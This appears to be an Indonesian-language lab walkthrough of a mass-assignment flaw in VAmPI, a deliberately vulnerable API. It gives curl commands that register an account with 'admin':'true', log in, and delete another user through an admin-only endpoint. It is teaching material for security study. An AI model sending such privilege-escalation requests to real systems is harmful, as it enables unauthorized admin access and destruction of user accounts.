# Mass Assignment
Framework terkadang memungkinkan developer untuk mengikat parameter request HTTP ke dalam variabel atau objek secara otomatis untuk membuat penggunaan framework tersebut mudah digunakan. Hal ini terkadang dapat menimbulkan kerugian. Misalnya, developer dapat membiarkan beberapa fungsi privat terbuka untuk umum seperti siapa pun dapat membuat akun admin. Jika fungsi semacam ini ada maka penyerang dapat memanfaatkannya. Celah keamanan ini berada di endpoint `/users/v1/register`. Melalui endpoint tersebut kita bisa mendaftarkan diri sebagai admin hanya dengan menambahkan parameter `admin=true`

```sh
curl http://IP_Server:5000/users/v1/register -d '{"email":"test@test.com","username":"test","password":"test","admin":"true"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%201.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%202.JPG)

- Sekarang kita coba registerasi sebagai user biasa dengan nama `test2`
```sh
curl http://IP_Server:5000/users/v1/register -d '{"email":"test2@test.com","username":"test2","password":"test2"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%203.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%204.JPG)

- Sekarang kita coba login sebagai user `test` yang sudah didaftarkan sebagai admin sebelumnya
```sh
curl http://IP_Server:5000/users/v1/login -d '{"username":"test","password":"test"}' -H 'Content-Type: application/json' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%205.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%206.JPG)

- Setelah itu kita coba hapus akun user `test2` dengan menggunakan akun user `test` menggunakan endpoint `/users/v1/{username}`
```sh
curl -X DELETE http://192.168.100.12:5000/users/v1/test2 -H 'Authorization: Bearer token' --proxy http://127.0.0.1:8080
```

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%206.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/mass%20assigment/mass%20assigment%207.JPG)

- User `test` ternyata bisa menggunakan endpoint `/users/v1/{username}` untuk menghapus akun user, dimana endpoint `/users/v1/{username}` sebenarnya hanya bisa digunakan oleh admin saja. Tapi dengan menambahkan parameter `admin=true` saat registerasi, akun tersebut akan otomatis terdaftar sebagai admin